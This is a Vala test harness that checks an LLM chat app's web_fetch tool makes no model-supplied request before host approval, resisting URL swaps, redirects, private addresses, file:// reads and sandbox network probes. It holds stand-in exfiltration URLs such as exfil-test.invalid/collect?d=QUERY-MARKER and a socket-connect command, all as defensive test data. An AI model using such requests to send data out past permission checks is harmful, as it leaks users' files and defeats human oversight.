/*
 * Copyright (C) 2026 Alan Knowles <alan@roojs.com>
 *
 * Spec for unapproved web_fetch exfiltration. These cases fail while a
 * model-supplied URL is fetched with no approval. They pass once a
 * fetch is sent only after the permission provider allows that same
 * host, and a denial or a URL swap sends nothing to the other host.
 *
 * Desktop binary links liboctools. Android binary compiles
 * ollmapp/android/tools/WebFetch instead of that library.
 */

namespace Exfil
{
	public class ProbeChat : OLLMchat.Call.ChatBase
	{
		public override string model { get; set; default = "probe"; }
		public override OLLMchat.Call.Options options {
			get; set; default = new OLLMchat.Call.Options();
		}

		public ProbeChat()
		{
			base(null);
		}

		public override async OLLMchat.Response.Chat send(
			Gee.ArrayList<OLLMchat.Message> messages,
			GLib.Cancellable? cancellable = null
		) throws GLib.Error {
			throw new GLib.IOError.FAILED("probe chat send is not used");
		}
	}

	public class ProbeAgent : GLib.Object, OLLMchat.Agent.Interface
	{
		public OLLMchat.Call.ChatBase chat_call { get; set; }
		public OLLMchat.ChatPermission.Provider permission { get; set; }
		public OLLMchat.Settings.Config2 cfg {
			get; set; default = new OLLMchat.Settings.Config2();
		}

		public OLLMchat.Call.ChatBase chat()
		{
			return this.chat_call;
		}

		public OLLMchat.ChatPermission.Provider get_permission_provider()
		{
			return this.permission;
		}

		public OLLMchat.Settings.Config2 config()
		{
			return this.cfg;
		}

		public void add_message(OLLMchat.Message message)
		{
		}
	}

	/**
	 * Records the URL presented for approval, then optionally rewrites
	 * request.url before returning. Traffic that lands before decided
	 * is set is an unapproved send.
	 */
	public class Gate : OLLMchat.ChatPermission.Provider
	{
		public bool asked = false;
		public bool decided = false;
		public bool allow = false;
		public string mutate = "";
		public string asked_url = "";
		public string asked_target = "";

		public Gate()
		{
			base("");
		}

		protected override async OLLMchat.ChatPermission.PermissionResponse request_user(
			OLLMchat.Tool.RequestBase request
		) {
			this.asked = true;
			this.asked_target = request.permission_target_path;
			this.asked_url = "";
			if (request is OLLMtools.WebFetch.Request) {
				this.asked_url = ((OLLMtools.WebFetch.Request) request).url;
			}
			if (this.mutate != "" && request is OLLMtools.WebFetch.Request) {
				((OLLMtools.WebFetch.Request) request).url = this.mutate;
			}
			this.decided = true;
			if (this.allow) {
				return OLLMchat.ChatPermission.PermissionResponse.ALLOW_ONCE;
			}
			return OLLMchat.ChatPermission.PermissionResponse.DENY_ONCE;
		}
	}

	/**
	 * Reaches protected fetch_url, the second GET in WebFetch.Request.
	 */
	public class OpenFetch : OLLMtools.WebFetch.Request
	{
		public async string pull(string target) throws GLib.Error
		{
			var bytes = yield this.fetch_url(target);
			return (string) bytes.get_data();
		}
	}

	public class Harness : GLib.Object
	{
		public Soup.Server v4;
		public Soup.Server v4b;
		public Soup.Server v6;
		public int port_a = 0;
		public int port_b = 0;
		public int port_6 = 0;
		private string[] hits = {};
		private string[] queued = {};
		public bool early = false;
		public string bad = "";
		public Gee.ArrayList<Soup.Server> keep_servers {
			get; set; default = new Gee.ArrayList<Soup.Server>();
		}
		public OLLMtools.WebFetch.Tool tool;
		public Exfil.ProbeAgent agent;
		public Exfil.ProbeChat chat;
		public Exfil.Gate gate;

		public Harness()
		{
			this.gate = new Exfil.Gate();
			this.chat = new Exfil.ProbeChat();
			this.agent = new Exfil.ProbeAgent();
			this.agent.chat_call = this.chat;
			this.agent.permission = this.gate;
			this.tool = new OLLMtools.WebFetch.Tool(null);
			this.tool.soup.timeout = 3;
			this.tool.soup.request_queued.connect((msg) => {
				this.queued += msg.get_uri().to_string();
				if (!this.gate.decided) {
					this.early = true;
				}
			});
			this.v4 = new Soup.Server("server-header", "exfil-a");
			this.v4.add_handler("/", (server, msg, path, query) => {
				this.hits += msg.get_method() + " " + msg.get_uri().to_string();
				if (path == "/bounce") {
					msg.set_redirect(302,
						"http://127.0.0.2:" + this.port_b.to_string() + "/landed");
					return;
				}
				msg.set_status(200, null);
				msg.set_response("text/plain", Soup.MemoryUse.COPY,
					"PLAINTEXT-BODY".data);
			});
			this.v4b = new Soup.Server("server-header", "exfil-b");
			this.v4b.add_handler("/", (server, msg, path, query) => {
				this.hits += msg.get_method() + " " + msg.get_uri().to_string();
				msg.set_status(200, null);
				msg.set_response("text/plain", Soup.MemoryUse.COPY,
					"PLAINTEXT-BODY".data);
			});
			this.v6 = new Soup.Server("server-header", "exfil-6");
			this.v6.add_handler("/", (server, msg, path, query) => {
				this.hits += msg.get_method() + " " + msg.get_uri().to_string();
				msg.set_status(200, null);
				msg.set_response("text/plain", Soup.MemoryUse.COPY,
					"PLAINTEXT-BODY".data);
			});
		}

		public async int go() throws GLib.Error
		{
			var addr_a = new GLib.InetSocketAddress(
				new GLib.InetAddress.from_string("127.0.0.1"), 0);
			this.v4.listen(addr_a, (Soup.ServerListenOptions) 0);
			var addr_b = new GLib.InetSocketAddress(
				new GLib.InetAddress.from_string("127.0.0.2"), 0);
			this.v4b.listen(addr_b, (Soup.ServerListenOptions) 0);
			var addr_6 = new GLib.InetSocketAddress(
				new GLib.InetAddress.from_string("::1"), 0);
			this.v6.listen(addr_6, (Soup.ServerListenOptions) 0);
			var uris_a = this.v4.get_uris();
			this.port_a = uris_a.data.get_port();
			var uris_b = this.v4b.get_uris();
			this.port_b = uris_b.data.get_port();
			var uris_6 = this.v6.get_uris();
			this.port_6 = uris_6.data.get_port();

			var url_a = "http://127.0.0.1:" + this.port_a.to_string() +
				"/q?d=QUERY-MARKER";
			yield this.case_unapproved(url_a, "unapproved_loopback_query");
			yield this.case_unapproved(
				"http://localhost:" + this.port_a.to_string() + "/q?d=QUERY-MARKER",
				"unapproved_localhost");
			yield this.case_unapproved(
				"http://[::1]:" + this.port_6.to_string() + "/q?d=QUERY-MARKER",
				"unapproved_ipv6_loopback");
			yield this.case_unapproved(
				"https://exfil-test.invalid/collect?d=QUERY-MARKER",
				"unapproved_invalid_host");
			string[] extra_hosts = {
				"10.1.2.3",
				"192.168.250.1",
				"172.16.250.1",
				"169.254.1.1"
			};
			foreach (var extra_host in extra_hosts) {
				var extra = new Soup.Server("server-header", "exfil-extra");
				extra.add_handler("/", (server, msg, path, query) => {
					this.hits += msg.get_method() + " " + msg.get_uri().to_string();
					msg.set_status(200, null);
					msg.set_response("text/plain", Soup.MemoryUse.COPY,
						"PLAINTEXT-BODY".data);
				});
				var extra_addr = new GLib.InetSocketAddress(
					new GLib.InetAddress.from_string(extra_host), 0);
				try {
					extra.listen(extra_addr, (Soup.ServerListenOptions) 0);
					this.keep_servers.add(extra);
				} catch (GLib.Error e) {
					stdout.printf("SKIP %s not bindable\n", extra_host);
					continue;
				}
				var extra_port = extra.get_uris().data.get_port();
				yield this.case_unapproved(
					"http://" + extra_host + ":" + extra_port.to_string() +
					"/q?d=QUERY-MARKER",
					"unapproved_" + extra_host);
			}

			this.arm(false, "");
			var denied = yield this.call_fetch(url_a, false);
			this.expect_quiet("deny_sends_nothing", denied);

			this.arm(true, "");
			var allowed = yield this.call_fetch(url_a, false);
			if (!this.gate.asked || this.early || this.hits.length == 0 ||
				allowed.index_of("PLAINTEXT-BODY") < 0) {
				this.bad += "approval_fetches_named_host asked=" +
					this.gate.asked.to_string() + " early=" + this.early.to_string() +
					" hits=" + this.hits.length.to_string() + " body=" + allowed + "\n";
			}
			if (this.gate.asked_url == "" ||
				!this.only_host(this.host_of(this.gate.asked_url))) {
				this.bad += "approval_fetches_named_host host mismatch target=" +
					this.gate.asked_target + " url=" + this.gate.asked_url + "\n";
			}

			this.arm(false, "");
			var other = "http://127.0.0.2:" + this.port_b.to_string() + "/q?d=QUERY-MARKER";
			var other_result = yield this.call_fetch(other, false);
			this.expect_quiet("other_loopback_needs_own_approval", other_result);

			var mutate_b = "http://127.0.0.2:" + this.port_b.to_string() + "/swapped";
			this.arm(true, mutate_b);
			var mutated = yield this.call_fetch(url_a, false);
			if (!this.gate.asked || this.early || this.host_hit("127.0.0.2")) {
				this.bad += "mutate_during_prompt leaked asked=" +
					this.gate.asked.to_string() + " early=" + this.early.to_string() +
					" body=" + mutated + "\n";
			}
			if (this.hits.length > 0 && !this.only_host("127.0.0.1")) {
				this.bad += "mutate_during_prompt fetched a host other than the approved one\n";
			}

			this.arm(false, "");
			var bounce = "http://127.0.0.1:" + this.port_a.to_string() + "/bounce?d=QUERY-MARKER";
			var bounce_denied = yield this.call_fetch(bounce, false);
			this.expect_quiet("redirect_unapproved", bounce_denied);

			this.arm(true, "");
			var bounce_ok = yield this.call_fetch(bounce, false);
			if (!this.gate.asked || this.early || this.host_hit("127.0.0.2")) {
				this.bad += "redirect_stops_at_approved_host asked=" +
					this.gate.asked.to_string() + " early=" + this.early.to_string() +
					" body=" + bounce_ok + "\n";
			}

			this.arm(false, "");
			var wrapped = yield this.call_fetch(url_a, true);
			this.expect_quiet("wrapped_tool_same_gate", wrapped);

			this.arm(false, "");
			var opener = new Exfil.OpenFetch();
			opener.tool = this.tool;
			opener.agent = this.agent;
			opener.url = url_a;
			var pulled = "";
			try {
				pulled = yield opener.pull(url_a);
			} catch (GLib.Error e) {
				pulled = "ERROR: " + e.message;
			}
			this.expect_quiet("fetch_url_same_gate", pulled);

			var marker_path = GLib.Path.build_filename(
				GLib.Environment.get_home_dir(), "ollm-exfil-read-marker.txt");
			GLib.FileUtils.set_contents(marker_path, "OUTSIDE-READ-MARKER");
			var bubble = new OLLMbwrap.Bubble(new OLLMbwrap.NoOpFileVerification());
			// avoid async vala ctor bug
			bubble.project_path = "";
			bubble.allow_network = false;
			bubble.write_tokens = { "no" };
			var read_out = "";
			try {
				read_out = yield bubble.exec("cat " + marker_path);
			} catch (GLib.Error e) {
				this.bad += "sandbox_read failed: " + e.message + "\n";
			}
			if (read_out.index_of("OUTSIDE-READ-MARKER") < 0) {
				this.bad += "sandbox_read did not return the outside file: " + read_out + "\n";
			}
			this.arm(false, "");
			var net_bubble = new OLLMbwrap.Bubble(new OLLMbwrap.NoOpFileVerification());
			net_bubble.project_path = "";
			net_bubble.allow_network = false;
			net_bubble.write_tokens = { "no" };
			try {
				yield net_bubble.exec(
					"python3 -c 'import socket; socket.create_connection((\"127.0.0.1\", " +
					this.port_a.to_string() + "), 2)'");
			} catch (GLib.Error e) {
				stdout.printf("sandbox network attempt: %s\n", e.message);
			}
			if (this.hits.length != 0 || this.early) {
				this.bad += "sandbox_network_reached_listener hits=" +
					this.hits.length.to_string() + "\n";
			}
			this.arm(false, "");
			var leaked = yield this.call_fetch(
				"http://127.0.0.1:" + this.port_a.to_string() + "/q?d=OUTSIDE-READ-MARKER",
				false);
			this.expect_quiet("sandbox_read_not_exfiltrated", leaked);
			if (this.joined(this.hits).index_of("OUTSIDE-READ-MARKER") >= 0 ||
				this.joined(this.queued).index_of("OUTSIDE-READ-MARKER") >= 0) {
				this.bad += "sandbox_read_not_exfiltrated marker left the machine\n";
			}
			this.arm(false, "");
			var file_url = "file://" + marker_path;
			var file_result = yield this.call_fetch(file_url, false);
			if (file_result.index_of("OUTSIDE-READ-MARKER") >= 0 || this.early) {
				this.bad += "file_scheme_not_read: " + file_result + "\n";
			}
			GLib.FileUtils.remove(marker_path);

			if (this.bad != "") {
				stdout.printf("%s", this.bad);
				stdout.puts("FAIL web_fetch exfil cases\n");
				return 1;
			}
			stdout.puts("PASS web_fetch exfil cases\n");
			return 0;
		}

		private void arm(bool allow, string mutate)
		{
			this.hits = {};
			this.queued = {};
			this.early = false;
			this.gate.asked = false;
			this.gate.decided = false;
			this.gate.allow = allow;
			this.gate.mutate = mutate;
			this.gate.asked_url = "";
			this.gate.asked_target = "";
			this.tool.is_wrapped = false;
		}

		private async string call_fetch(string url, bool wrapped) throws GLib.Error
		{
			var args = new Json.Object();
			args.set_string_member("url", url);
			args.set_string_member("format", "raw");
			var node = new Json.Node(Json.NodeType.OBJECT);
			node.set_object(args);
			OLLMchat.Tool.RequestBase? request = null;
			if (wrapped) {
				this.tool.is_wrapped = true;
				this.tool.command_template = "unused";
				request = this.tool.deserialize_wrapped(node, "unused");
			}
			if (!wrapped) {
				this.tool.is_wrapped = false;
				request = Json.gobject_deserialize(
					typeof(OLLMtools.WebFetch.Request), node)
					as OLLMchat.Tool.RequestBase;
			}
			if (request == null) {
				return "ERROR: deserialize failed";
			}
			request.tool = this.tool;
			request.agent = this.agent;
			return yield request.execute();
		}

		private async void case_unapproved(string url, string label) throws GLib.Error
		{
			this.arm(false, "");
			var result = yield this.call_fetch(url, false);
			this.expect_quiet(label, result);
		}

		private void expect_quiet(string label, string result)
		{
			if (!this.early && this.hits.length == 0 && this.queued.length == 0 &&
				result.has_prefix("ERROR:") &&
				result.index_of("PLAINTEXT-BODY") < 0) {
				stdout.printf("PASS %s\n", label);
				return;
			}
			this.bad += label + " early=" + this.early.to_string() +
				" hits=" + this.hits.length.to_string() +
				" queued=" + this.queued.length.to_string() +
				" asked=" + this.gate.asked.to_string() +
				" result=" + result + "\n";
			stdout.printf("FAIL %s\n", label);
		}

		private bool host_hit(string host)
		{
			foreach (var line in this.hits) {
				if (this.host_of(this.line_url(line)) == host) {
					return true;
				}
			}
			foreach (var line in this.queued) {
				if (this.host_of(line) == host) {
					return true;
				}
			}
			return false;
		}

		private bool only_host(string host)
		{
			if (this.hits.length == 0 && this.queued.length == 0) {
				return false;
			}
			foreach (var line in this.hits) {
				if (this.host_of(this.line_url(line)) != host) {
					return false;
				}
			}
			foreach (var line in this.queued) {
				if (this.host_of(line) != host) {
					return false;
				}
			}
			return true;
		}

		private string line_url(string line)
		{
			var sp = line.index_of(" ");
			if (sp < 0) {
				return line;
			}
			return line.substring(sp + 1);
		}

		private string host_of(string url)
		{
			if (url == "") {
				return "";
			}
			try {
				var parsed = GLib.Uri.parse(url, GLib.UriFlags.NONE);
				var host = parsed.get_host();
				if (host == null) {
					return "";
				}
				return host;
			} catch (GLib.Error e) {
				return "";
			}
		}

		private string joined(string[] lines)
		{
			return string.joinv("\n", lines);
		}
	}
}

private static int main(string[] args)
{
	var harness = new Exfil.Harness();
	var loop = new GLib.MainLoop();
	var code = 1;
	harness.go.begin((obj, res) => {
		try {
			code = harness.go.end(res);
		} catch (GLib.Error e) {
			stdout.printf("HARNESS ERROR: %s\n", e.message);
			code = 1;
		}
		loop.quit();
	});
	loop.run();
	return code;
}
